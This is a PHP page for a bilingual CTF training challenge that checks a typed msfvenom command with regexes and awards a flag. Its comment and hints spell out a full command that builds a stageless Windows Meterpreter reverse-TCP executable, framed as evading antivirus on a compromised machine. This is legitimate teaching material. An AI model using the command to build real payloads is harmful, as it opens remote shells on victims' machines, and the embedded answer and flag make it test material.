<?php
require_once __DIR__ . '/../bootstrap.php';

$pageTitle = $lang === 'es' ? 'Reto CTF #21: Msfvenom Crafter — CyberEscudo' : 'CTF Challenge #21: Msfvenom Crafter — CyberEscudo';
$pageDescription = $lang === 'es' ? 'Simulador de generación de payloads con msfvenom.' : 'Payload generation simulator with msfvenom.';
$current_page = 'ctf/ctf-21.php';
require __DIR__ . '/../templates/header.php';

$feedback = "";
$flag = "";
$esExito = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    
    // Validar el payload de msfvenom stageless
    // Objetivo: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o shell.exe
    
    // 1. Comando base
    $isMsfvenom = preg_match('/^msfvenom\b/i', $cmd);
    
    // 2. Payload Stageless (Meterpreter Reverse TCP sin barras intermedias al final)
    $hasPayload = preg_match('/-p\s+windows\/x64\/meterpreter_reverse_tcp\b/i', $cmd);
    
    // 3. Variables LHOST y LPORT
    $hasLhost = preg_match('/LHOST=10\.10\.14\.50\b/i', $cmd);
    $hasLport = preg_match('/LPORT=4444\b/i', $cmd);
    
    // 4. Formato de salida ejecutable (-f exe)
    $hasFormat = preg_match('/-f\s+exe\b/i', $cmd);

    if ($isMsfvenom && $hasPayload && $hasLhost && $hasLport && $hasFormat) {
        $esExito = true;
        $feedback = $lang === 'es' 
            ? "¡Ejecutable generado con éxito! El payload stageless se conectará directamente a tu máquina sin requerir descargas adicionales, evadiendo el IPS perimetral." 
            : "Executable generated successfully! The stageless payload will connect directly to your machine without requiring further downloads, evading the perimeter IPS.";
        $flag = "FLAG{msfvenom_payload_crafter}";
    } else {
        $errores = [];
        if (!$isMsfvenom) $errores[] = $lang === 'es' ? "Debe empezar por 'msfvenom'" : "Must start with 'msfvenom'";
        if (!$hasPayload) $errores[] = $lang === 'es' ? "Falta el payload exacto para Windows x64 Stageless (-p windows/x64/meterpreter_reverse_tcp)" : "Missing exact Windows x64 Stageless payload (-p windows/x64/meterpreter_reverse_tcp)";
        if (!$hasLhost) $errores[] = $lang === 'es' ? "Falta configurar la IP de escucha (LHOST=10.10.14.50)" : "Missing listening IP configuration (LHOST=10.10.14.50)";
        if (!$hasLport) $errores[] = $lang === 'es' ? "Falta configurar el puerto de escucha (LPORT=4444)" : "Missing listening port configuration (LPORT=4444)";
        if (!$hasFormat) $errores[] = $lang === 'es' ? "Debes compilarlo en formato ejecutable de Windows (-f exe)" : "You must compile it in Windows executable format (-f exe)";
        
        $feedback = "[FATAL ERROR] " . implode(" | ", $errores);
    }
}
?>

<main class="content-page">
    <div class="md-container m-bottom-2" style="max-width: 900px; margin: 0 auto; padding-top: 4rem;">
        <span class="section-label" style="color: #ff2a2a;">// <?= $lang === 'es' ? 'RETO CTF 21' : 'CTF CHALLENGE 21' ?></span>
        <h1 style="text-align: center; margin-bottom: 2rem;"><?= $lang === 'es' ? 'Arsenal Payload Crafter' : 'Arsenal Payload Crafter' ?></h1>
        
        <div style="background: rgba(10,15,20,0.8); padding: 2rem; border: 1px solid var(--cyan); border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,255,0.1);">
            
            <div style="background: #111; padding: 1.5rem; border-left: 4px solid #ff2a2a; margin-bottom: 2rem;">
                <h3 style="color: #ff2a2a; margin-top: 0;">💣 <?= $lang === 'es' ? 'Construcción de Malware' : 'Malware Construction' ?></h3>
                <p style="color: var(--white); font-size: 0.95rem; line-height: 1.6; margin-bottom: 0;">
                    <?= $lang === 'es' ? 'Tienes acceso al equipo del Director a través de una brecha de Ingeniería Social, pero su Antivirus y Firewall perimetral bloquean los "Stagers" habituales.<br><br>Crea el comando de <strong>msfvenom</strong> exacto para generar un payload <strong>Stageless</strong> de Meterpreter para Windows de 64 bits (Reverse TCP). Haz que apunte a tu IP local <code>10.10.14.50</code> por el puerto <code>4444</code>, y que se compile en formato <code>exe</code>.' : 'You have access to the Director\'s computer through a Social Engineering breach, but their Antivirus and perimeter Firewall block standard "Stagers".<br><br>Create the exact <strong>msfvenom</strong> command to generate a <strong>Stageless</strong> Meterpreter payload for 64-bit Windows (Reverse TCP). Point it to your local IP <code>10.10.14.50</code> on port <code>4444</code>, and compile it in <code>exe</code> format.' ?>
                </p>
            </div>
            
            <form method="POST" action="">
                <label style="display:block; color: var(--cyan); font-family: var(--mono); margin-bottom: 0.5rem;">
                    Terminal (Kali Linux):
                </label>
                <div style="display: flex; align-items: center; background: #050505; border: 1px solid #333; padding: 0.5rem; border-radius: 4px; margin-bottom: 1.5rem;">
                    <span style="color: #00ff00; margin-right: 10px; font-family: var(--mono);">kali@attackbox:~$</span>
                    <input type="text" name="cmd" class="cyber-input" style="flex: 1; border: none; background: transparent; padding: 0; box-shadow: none;" placeholder="msfvenom -p ..." autocomplete="off" value="<?= htmlspecialchars($_POST['cmd'] ?? '') ?>">
                </div>
                
                <button type="submit" style="width: 100%; background: var(--cyan); border: none; color: #000; padding: 15px; font-family: var(--mono); font-weight: bold; cursor: pointer; font-size: 1rem; transition: background 0.3s;">
                    <?= $lang === 'es' ? 'GENERAR PAYLOAD' : 'GENERATE PAYLOAD' ?>
                </button>
            </form>

            <?php if($feedback !== ""): ?>
                <div style="margin-top: 2rem; padding: 1rem; background: <?= $esExito ? 'rgba(0,255,0,0.1)' : 'rgba(255,42,42,0.1)' ?>; border: 1px solid <?= $esExito ? '#00ff00' : '#ff2a2a' ?>; font-family: var(--mono); font-size: 0.9rem; color: <?= $esExito ? '#00ff00' : '#ff2a2a' ?>; line-height: 1.5;">
                    <?= $feedback ?>
                </div>
            <?php endif; ?>

            <?php if($esExito): ?>
                <div style="margin-top: 1.5rem; text-align: center; animation: pulse 2s infinite;">
                    <h3 style="color: #00ff00; margin: 1rem 0; font-family: var(--mono); letter-spacing: 2px;"><?= $flag ?></h3>
                    <p style="margin:0; font-size: 0.85rem; color: var(--cyan);">
                        <?= $lang === 'es' ? 'Canjea tu logro operativo en la terminal principal:' : 'Redeem your operational achievement in the main terminal:' ?> <strong>submit <?= $flag ?></strong>
                    </p>
                </div>
            <?php endif; ?>

        </div>
    </div>
</main>

<?php require __DIR__ . '/../templates/footer.php'; ?>